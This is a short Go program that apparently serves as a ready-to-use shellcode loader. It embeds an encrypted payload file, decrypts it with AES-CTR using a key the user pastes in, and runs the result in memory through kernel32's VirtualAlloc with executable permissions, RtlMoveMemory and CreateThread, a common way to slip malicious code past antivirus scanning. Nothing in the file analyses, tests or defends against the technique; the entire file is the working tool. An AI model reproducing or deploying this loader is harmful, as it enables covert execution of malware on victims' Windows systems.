package main

import (
	_ "embed"
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"syscall"
	"unsafe"
)

//go:embed payload.bin
var encryptedData []byte

var keyHex = "PASTE_KEY_HERE" // Replace with your key

func main() {
	// Decode key
	key, _ := hex.DecodeString(keyHex)
	
	// IV is first 16 bytes
	iv := encryptedData[:16]
	ciphertext := encryptedData[16:]
	
	// Decrypt
	block, _ := aes.NewCipher(key)
	stream := cipher.NewCTR(block, iv)
	decrypted := make([]byte, len(ciphertext))
	stream.XORKeyStream(decrypted, ciphertext)
	
	// Execute in memory
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	virtualAlloc := kernel32.NewProc("VirtualAlloc")
	rtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
	createThread := kernel32.NewProc("CreateThread")
	
	addr, _, _ := virtualAlloc.Call(0, uintptr(len(decrypted)), 0x3000, 0x40)
	rtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&decrypted[0])), uintptr(len(decrypted)))
	createThread.Call(0, 0, addr, 0, 0, 0)
}
